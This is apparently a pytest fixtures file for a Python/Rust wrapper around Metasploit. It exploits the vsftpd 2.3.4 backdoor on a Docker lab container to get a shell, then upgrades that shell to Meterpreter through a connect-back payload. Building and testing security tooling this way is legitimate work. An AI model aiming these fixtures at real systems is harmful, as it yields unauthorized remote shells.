"""Pytest fixtures and configuration."""

import asyncio
import os
import subprocess
import time
from pathlib import Path

import pytest

from assassinate.ipc import MsfClient


# =============================================================================
# Pytest Configuration
# =============================================================================


def pytest_configure(config):
    """Register custom markers."""
    config.addinivalue_line(
        "markers",
        "integration: marks tests as integration tests (require target container)",
    )
    config.addinivalue_line(
        "markers",
        "meterpreter: marks tests that require a Meterpreter session",
    )
    config.addinivalue_line(
        "markers",
        "shell: marks tests that require a shell session",
    )


# =============================================================================
# Environment Detection
# =============================================================================


def is_integration_env() -> bool:
    """Check if running in integration test environment."""
    return os.environ.get("INTEGRATION_TESTS", "").lower() == "true"


def get_target_host() -> str:
    """Get the target container hostname."""
    return os.environ.get("TARGET_HOST", "target-linux")


def get_target_ftp_port() -> int:
    """Get the target FTP port (default: 21)."""
    return int(os.environ.get("TARGET_FTP_PORT", "21"))


def get_target_shell_port() -> int:
    """Get the target shell listener port."""
    return int(os.environ.get("TARGET_SHELL_PORT", "4445"))


def get_target_backdoor_port() -> int:
    """Get the target backdoor port (vsftpd backdoor shell)."""
    return int(os.environ.get("TARGET_BACKDOOR_PORT", "6200"))


@pytest.fixture(scope="session")
def daemon_process():
    """Start daemon for testing session."""
    # Check CARGO_TARGET_DIR first (used in CI containers), then fall back to default
    cargo_target_dir = os.environ.get("CARGO_TARGET_DIR")
    if cargo_target_dir:
        daemon_path = Path(cargo_target_dir) / "release" / "daemon"
    else:
        daemon_path = (
            Path(__file__).parent.parent.parent
            / "rust"
            / "daemon"
            / "target"
            / "release"
            / "daemon"
        )

    # Check MSF_ROOT env var first (used in CI), then fall back to default
    msf_root_env = os.environ.get("MSF_ROOT")
    if msf_root_env:
        msf_root = Path(msf_root_env)
    else:
        msf_root = Path(__file__).parent.parent.parent / "metasploit-framework"

    if not daemon_path.exists():
        pytest.skip("Daemon not built - run: cargo build --release -p daemon")

    # Kill any existing daemon
    subprocess.run(
        ["pkill", "-f", "daemon.*msf-root"], stderr=subprocess.DEVNULL
    )
    time.sleep(1)

    # Clean up shared memory (use glob since subprocess doesn't expand wildcards)
    import glob as glob_module
    for shm_file in glob_module.glob("/dev/shm/assassinate_msf_ipc*"):
        try:
            os.remove(shm_file)
        except OSError:
            pass

    # Build environment with LD_LIBRARY_PATH if needed (for rbenv Ruby)
    env = os.environ.copy()

    # Ensure ASSASSINATE_WORKSPACE is set for credential reporting
    if "ASSASSINATE_WORKSPACE" not in env:
        env["ASSASSINATE_WORKSPACE"] = "default"

    # Check if using rbenv and add library path
    rbenv_root = Path.home() / ".rbenv"
    if rbenv_root.exists():
        # Find the Ruby version being used
        ruby_version_file = Path(__file__).parent.parent / ".ruby-version"
        if ruby_version_file.exists():
            ruby_version = ruby_version_file.read_text().strip()
            ruby_lib_path = rbenv_root / "versions" / ruby_version / "lib"
            if ruby_lib_path.exists():
                existing_ld_path = env.get("LD_LIBRARY_PATH", "")
                env["LD_LIBRARY_PATH"] = (
                    f"{ruby_lib_path}:{existing_ld_path}"
                    if existing_ld_path
                    else str(ruby_lib_path)
                )

    # Start daemon with output logged to file for debugging
    daemon_log = Path("/tmp/daemon_test.log")
    daemon_log_file = daemon_log.open("w")
    proc = subprocess.Popen(
        [
            str(daemon_path),
            "--msf-root",
            str(msf_root),
            "--log-level",
            "debug",
        ],
        stdout=daemon_log_file,
        stderr=subprocess.STDOUT,
        env=env,
    )

    # Wait for daemon to start and initialize
    time.sleep(8)

    # Verify it's running
    if proc.poll() is not None:
        daemon_log_file.close()
        log_content = daemon_log.read_text() if daemon_log.exists() else "No log"
        print("\n=== DAEMON STARTUP FAILED ===")
        print(f"Command: {daemon_path} --msf-root {msf_root}")
        print(f"Log:\n{log_content}")
        print(f"LD_LIBRARY_PATH: {env.get('LD_LIBRARY_PATH')}")
        print(f"ASSASSINATE_WORKSPACE: {env.get('ASSASSINATE_WORKSPACE')}")
        pytest.fail(f"Daemon failed to start:\n{log_content}")

    # Double-check shared memory was created
    import glob

    shm_files = glob.glob("/dev/shm/assassinate_msf_ipc*")
    if not shm_files:
        # Wait a bit more for slow initialization
        time.sleep(5)
        shm_files = glob.glob("/dev/shm/assassinate_msf_ipc*")
        if not shm_files:
            daemon_log_file.close()
            log_content = daemon_log.read_text() if daemon_log.exists() else "No log"
            pytest.fail(
                f"Daemon started but shared memory not created. Daemon may have crashed.\nLog: {log_content}"
            )

    yield proc

    # Cleanup
    proc.terminate()
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()
    daemon_log_file.close()


@pytest.fixture
async def client(daemon_process):
    """Get connected MSF client."""
    client = MsfClient()
    await client.connect()
    yield client
    await client.disconnect()


@pytest.fixture
async def test_module(client):
    """Create a test module for testing."""
    # Use vsftpd backdoor - well-known, simple exploit
    module_id = await client.create_module(
        "exploit/unix/ftp/vsftpd_234_backdoor"
    )
    yield module_id
    # Cleanup module to prevent memory leak
    await client.delete_module(module_id)


# =============================================================================
# Integration Test Fixtures
# =============================================================================


@pytest.fixture
def integration_env():
    """Ensure we're in integration test environment.

    Skip tests if INTEGRATION_TESTS env var is not set.
    Integration tests run inside Docker via:
        docker compose -f docker/docker-compose.yml run --rm integration-test
    """
    if not is_integration_env():
        pytest.skip("Not in integration test environment (INTEGRATION_TESTS != true)")
    return {
        "target_host": get_target_host(),
        "ftp_port": get_target_ftp_port(),
        "shell_port": get_target_shell_port(),
        "backdoor_port": get_target_backdoor_port(),
    }


@pytest.fixture
async def shell_session(client, integration_env):
    """Exploit vsftpd backdoor and return a shell session.

    This fixture:
    1. Creates the vsftpd_234_backdoor exploit module
    2. Configures it for the target container
    3. Runs the exploit
    4. Waits for session to be created
    5. Yields the session ID
    6. Cleans up the session after test

    Requires: INTEGRATION_TESTS=true, target-linux container running
    """
    target_host = integration_env["target_host"]
    ftp_port = integration_env["ftp_port"]

    print(f"\n🎯 Exploiting vsftpd backdoor on {target_host}:{ftp_port}")

    # Create exploit module
    module_id = await client.create_module("exploit/unix/ftp/vsftpd_234_backdoor")
    session_id = None  # Initialize before try block for finally clause

    try:
        # Configure exploit
        await client.module_set_option(module_id, "RHOSTS", target_host)
        await client.module_set_option(module_id, "RPORT", str(ftp_port))

        # Get sessions before exploit
        sessions_before = await client.sessions_list()
        session_ids_before = set(sessions_before) if sessions_before else set()

        # Run exploit with appropriate payload for shell session
        # module_exploit has 30s default timeout for exploit execution
        print("   Running exploit...")
        result = await client.module_exploit(module_id, "cmd/unix/interact")
        print(f"   Exploit result: {result}")

        # Wait for session with timeout
        for attempt in range(30):  # 30 seconds timeout
            await asyncio.sleep(1)
            sessions_after = await client.sessions_list()
            session_ids_after = set(sessions_after) if sessions_after else set()

            new_sessions = session_ids_after - session_ids_before
            if new_sessions:
                session_id = list(new_sessions)[0]
                print(f"   ✓ Got shell session: {session_id}")
                break

            if attempt % 5 == 0:
                print(f"   Waiting for session... ({attempt}s)")

        if session_id is None:
            pytest.fail("Failed to get shell session from exploit")

        yield session_id

    finally:
        # Cleanup
        await client.delete_module(module_id)
        if session_id is not None:
            try:
                await client.session_kill(session_id)
                print(f"   🧹 Cleaned up session {session_id}")
            except Exception:
                pass  # Session may already be dead


@pytest.fixture
async def meterpreter_session(client, shell_session):
    """Upgrade shell session to Meterpreter.

    This fixture:
    1. Uses the shell_session fixture to get a shell
    2. Upgrades it to Meterpreter using shell_to_meterpreter
    3. Waits for Meterpreter session
    4. Yields the Meterpreter session ID
    5. Cleans up after test

    Note: The original shell session is cleaned up by shell_session fixture.
    """
    # Get LHOST - use the test container's IP on the docker network
    # In docker-compose, services can reach each other by service name
    lhost = os.environ.get("LHOST", "integration-test")
    lport = int(os.environ.get("LPORT", "4433"))

    print(f"\n🔄 Upgrading shell {shell_session} to Meterpreter")
    print(f"   LHOST={lhost}, LPORT={lport}")

    # Get sessions before upgrade
    sessions_before = await client.sessions_list()
    session_ids_before = set(sessions_before) if sessions_before else set()

    # Upgrade shell to Meterpreter
    try:
        await client.session_shell_to_meterpreter(shell_session, lhost, lport)
    except Exception as e:
        print(f"   Warning: Upgrade command returned: {e}")

    # Wait for Meterpreter session
    meterpreter_session_id = None
    for attempt in range(60):  # 60 seconds timeout for upgrade
        await asyncio.sleep(1)
        sessions_after = await client.sessions_list()

        for sid, info in sessions_after.items():
            if sid in session_ids_before:
                continue
            session_type = await client.session_type(sid)
            if "meterpreter" in session_type.lower():
                meterpreter_session_id = sid
                print(f"   ✓ Got Meterpreter session: {sid}")
                break

        if meterpreter_session_id:
            break

        if attempt % 10 == 0:
            print(f"   Waiting for Meterpreter session... ({attempt}s)")

    if meterpreter_session_id is None:
        pytest.fail("Failed to upgrade to Meterpreter session")

    yield meterpreter_session_id

    # Cleanup Meterpreter session
    try:
        await client.session_kill(meterpreter_session_id)
        print(f"   🧹 Cleaned up Meterpreter session {meterpreter_session_id}")
    except Exception:
        pass


@pytest.fixture
async def direct_shell_session(client, integration_env):
    """Connect to the pre-configured shell listener on the target.

    This fixture connects to the socat shell listener on port 4445,
    providing a simple shell session without needing to exploit anything.

    Uses direct socket connection + CommandShell registration (no MSF payload protocol).
    Faster than shell_session for tests that just need any shell.
    """
    target_host = integration_env["target_host"]
    shell_port = integration_env["shell_port"]

    print(f"\n🔌 Connecting to shell listener on {target_host}:{shell_port}")

    session_id = None
    try:
        # Create shell session using direct socket connection
        session_id = await client.create_shell_session(target_host, shell_port, timeout=10)
        print(f"   ✓ Got direct shell session: {session_id}")

        yield session_id

    except Exception as e:
        pytest.skip(f"Could not connect to direct shell listener: {e}")

    finally:
        if session_id is not None:
            try:
                await client.session_kill(session_id)
                print(f"   🧹 Cleaned up session {session_id}")
            except Exception:
                pass


@pytest.fixture
async def direct_meterpreter_session(client, direct_shell_session, integration_env):
    """Create a Meterpreter session by upgrading a shell session.

    This fixture:
    1. Uses direct_shell_session to get a reliable shell via socat
    2. Starts a multi/handler listening for Meterpreter connections
    3. Calls shell_to_meterpreter() to upgrade the shell
    4. Waits for the Meterpreter session to connect
    5. Yields the Meterpreter session ID
    6. Cleans up after test

    Requires:
    - INTEGRATION_TESTS=true
    - target-linux container running
    """
    shell_session_id = direct_shell_session

    # LHOST/LPORT for the handler (integration-test container listens)
    # IMPORTANT: LHOST must be the actual IP of this container, NOT 0.0.0.0!
    # The payload needs to connect back to us, so it needs our real IP.
    lhost = os.environ.get("LHOST")
    if not lhost:
        # Auto-detect container IP
        import socket
        lhost = socket.gethostbyname(socket.gethostname())
    lport = int(os.environ.get("LPORT", "4433"))

    print(f"\n🔄 Upgrading shell session {shell_session_id} to Meterpreter")
    print(f"   Handler: {lhost}:{lport}")

    meterpreter_session_id = None

    try:
        # Step 1: Get sessions before upgrade
        sessions_before = await client.sessions_list()
        session_ids_before = set(sessions_before) if sessions_before else set()
        print(f"   Sessions before: {session_ids_before}")

        # Step 2: Initiate shell to Meterpreter upgrade
        # This runs a post module that:
        # - Generates a Meterpreter payload
        # - Uploads it to the target
        # - Executes it
        # - The payload connects back to LHOST:LPORT
        print("   Initiating upgrade...")
        try:
            result = await client.session_shell_to_meterpreter(
                shell_session_id, lhost, lport
            )
            print(f"   Upgrade initiated: {result}")
        except Exception as e:
            # The upgrade command may return an error even if it works
            print(f"   Upgrade command returned: {e}")

        # Step 3: Wait for Meterpreter session
        print("   Waiting for Meterpreter session...")
        for attempt in range(90):  # 90 second timeout for upgrade
            await asyncio.sleep(1)
            sessions_after = await client.sessions_list()  # Returns list[int]

            for sid in sessions_after:
                if sid in session_ids_before:
                    continue
                # Check if it's a Meterpreter session
                try:
                    session_type = await client.session_type(sid)
                    if "meterpreter" in session_type.lower():
                        meterpreter_session_id = sid
                        print(f"   ✓ Got Meterpreter session: {meterpreter_session_id}")
                        break
                except Exception:
                    continue

            if meterpreter_session_id:
                break

            if attempt % 15 == 0 and attempt > 0:
                print(f"   Still waiting... ({attempt}s)")

        if meterpreter_session_id is None:
            pytest.fail("Meterpreter session did not connect within timeout")

        yield meterpreter_session_id

    finally:
        # Cleanup Meterpreter session (shell session cleaned up by direct_shell_session)
        if meterpreter_session_id is not None:
            try:
                await client.session_kill(meterpreter_session_id)
                print(f"   🧹 Cleaned up Meterpreter session {meterpreter_session_id}")
            except Exception:
                pass
